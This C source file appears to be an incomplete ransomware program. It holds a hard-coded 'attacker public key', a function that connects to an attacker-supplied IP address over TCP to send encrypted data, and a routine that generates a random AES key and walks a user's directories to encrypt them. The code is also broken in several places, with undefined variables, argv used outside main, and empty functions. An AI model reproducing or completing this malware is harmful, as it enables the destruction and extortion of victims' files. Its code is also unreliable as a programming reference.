#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <unistd.h>
#include <openssl/evp.h>
#include <dirent.h>

//RSA-2048 attacker public key.
char* publicKey = "MIIBITANBgkqhkiG9w0BAQEFAAOCAQ4AMIIBCQ"
                  "KCAQBVsejWJHjJO/VCu+vJj6QklpPbZODP+A4e"
                  "2ZYOf4sGt+ce/7+AP9YKFmaWAXhd1LOb9mfzng"
                  "RCNGIzJBNOssNBPJXie5wT7EbXKJ1YsH/3Efnp5"
                  "7DEWaeLe/LwIUfe2+ufzNIZhCKDdKSItFaSQ0yO"
                  "4ylXU8SCp6HxCGbdTw0EXat2wEs2vXRRXxG06Ej"
                  "fMjwSEnygr0WKBAzHHYOFm6dNnlZyisYupd1a2l"
                  "D9Ip5w/6lh9z2RRz4BoX9GI3XHW4mm+qeW2aF3i"
                  "6QdI2mu8CnjQIPilqcKabx2jX7n8wHgf0rUcQyj"
                  "7b3nEo1fBhtQO29VgffawI8uQian7Tg8Vk7xAgMBAAE=";

EVP_CIPHER_CTX* dirEncryptContext = NULL;
unsigned char* dirEncryptKey = NULL;


int block_encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key, unsigned char *iv, unsigned char *ciphertext)
{
    /* Declare cipher context */
    EVP_CIPHER_CTX *ctx;

    int len;
    int outLength = plaintext_len;

    /* Create and initialize the context */
    ctx = EVP_CIPHER_CTX_new();

    /* Initialize the encryption operation. */
    EVP_EncryptInit_ex(ctx,  EVP_aes_256_cbc(), NULL,key,iv);

    /* Provide the message to be encrypted, and obtain the encrypted output. EVP_EncryptUpdate can be called multiple times if necessary */
    EVP_EncryptUpdate(ctx, ciphertext, &outLength, plaintext, plaintext_len);

    /* Finalize the encryption. Further ciphertext bytes may be written at this stage. */
    EVP_EncryptFinal_ex(ctx,ciphertext + outLength ,&outLength);

    /* Clean up */
    EVP_CIPHER_CTX_free(ctx);


    return outLength;
}

int sendMessageToAttacker(char* encryptedKey){

    int protocol = 6;//TCP Protocol
    int domain = AF_INET;
    int type = SOCK_STREAM;
    struct sockaddr_in server_address;

    //create socket
    int sockfd = socket(domain, type, protocol);
    if(sockfd == -1) {
        printf("ErrorCreatingSocket\n");
        return -1;
    }

    server_address.sin_family = domain;
    int portNumber = 1026;
    in_addr_t ipConverted = inet_addr(argv[1]);
    server_address.sin_addr.s_addr = ipConverted;
    server_address.sin_port = htons(portNumber);

    size_t size = sizeof(server_address);
    //connect to socket
    int retVal = connect(sockfd, (const struct sockaddr*) &server_address, size);
    if(retVal == -1) {
        printf("ErrorConnectingSocket\n");
        return -1;
    }

    // Get input from the user:
    size_t clientMsgSize = 100;
    unsigned char clientMessage[clientMsgSize];
    printf("Enter message sent to the server(100 char max): ");
    fgets(clientMessage, clientMsgSize, stdin);

    size_t cipherLength = clientMsgSize +16+1;
    unsigned char cipherText[cipherLength];

    int cipherLengthReal = block_encrypt(clientMessage, clientMsgSize, argv[2], argv[3], cipherText);

    cipherText[cipherLength] = 0;
    printf("Client sends cipher text:\n");
    printf( "%s\n",cipherText);


    // Send the message to server:
    ssize_t bytesSent = send(sockfd, cipherText, cipherLength, 0);
    if(bytesSent == -1) {
        printf("errorSending\n");
        return -1;
    }

    // Receive the server's response:
    size_t inputBufferLength = 100;
    char inputBuffer[inputBufferLength];
    ssize_t bytesReceived = recv(sockfd, inputBuffer, inputBufferLength, 0);
    if(bytesReceived == -1){
        printf("errorReceive\n");
        return -1;
    }
    else printf("Server says: %s\n", inputBuffer);

    // Close the socket:
    int retCloseVal = close(sockfd);
    if(retCloseVal == -1) {
        printf("ErrorClosing\n");
        return -1;
    }


    return 0;

}

char* concatStrings(char* str1, char* str2){





}

int encryptUserDirectory(char* directoryPath){

    int len;
    int outLength = plaintext_len;
    int errorVal = 0;

    if(dirEncryptContext == NULL){

        dirEncryptContext = EVP_CIPHER_CTX_new();

        EVP_EncryptInit_ex(dirEncryptContext,  EVP_aes_256_cbc(), NULL,NULL,NULL);

        int keyLen = EVP_CIPHER_CTX_get_key_length(dirEncryptContext);

        dirEncryptKey = (unsigned char*)malloc(keyLen * sizeof(unsigned char));

        errorVal = EVP_CIPHER_CTX_rand_key(dirEncryptContext,dirEncryptKey);
        if(errorVal <1){
            printf("%s", "Error with symmetric key gen");
            return -1;

        }
    }

    DIR* userDir = opendir(directoryPath);
    if(userDir == NULL){
        printf("%s", "Error with directory");
        return -1;
    }

    struct dirent* currentEntry;

    while (currentEntry != NULL) {

        char* entryName = (*currentEntry).d_name;
        int dirPathLen = strlen(directoryPath);
        int entryNameLen = strlen(entryName);




        if ((*currentEntry).d_type == DT_DIR) {

            printf("'%s' is a directory\n", full_name);
            // Recurse unless the directory is the current or parent directory.
            if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                return read_directories(full_name);
            }
        } else {
            printf("'%s' is a file\n", full_name);
        }

        currentEntry = readdir(userDir);
    }















}

int main(int argc, unsigned char** argv){






    return 0;

}
